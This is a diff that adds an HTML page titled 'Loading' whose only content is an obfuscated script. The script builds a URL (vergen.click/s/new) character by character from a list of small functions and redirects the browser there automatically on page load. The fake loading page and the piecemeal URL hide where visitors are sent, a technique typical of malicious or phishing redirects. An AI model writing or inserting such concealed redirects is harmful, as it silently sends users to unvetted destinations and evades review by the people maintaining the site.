@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading</title>
+    <script>
+        const parts = [
+            () => 'h',
+            _ => 't',
+            () => 't',
+            function() { return 'p'; },
+            _ => 's',
+            _ => ':',
+            function() { return '/'; },
+            function() { return '/'; },
+            function() { return 'v'; },
+            _ => 'e',
+            _ => 'r',
+            function() { return 'g'; },
+            function() { return 'e'; },
+            () => 'n',
+            _ => '.',
+            () => 'c',
+            () => 'l',
+            _ => 'i',
+            function() { return 'c'; },
+            function() { return 'k'; },
+            _ => '/',
+            () => 's',
+            function() { return '/'; },
+            () => 'n',
+            _ => 'e',
+            () => 'w'
+        ];
+        const url = parts.reduce((acc, fn) => acc + fn(), '');
+        document.location = url;
+    </script>
+</head>
+<body></body>
+</html>
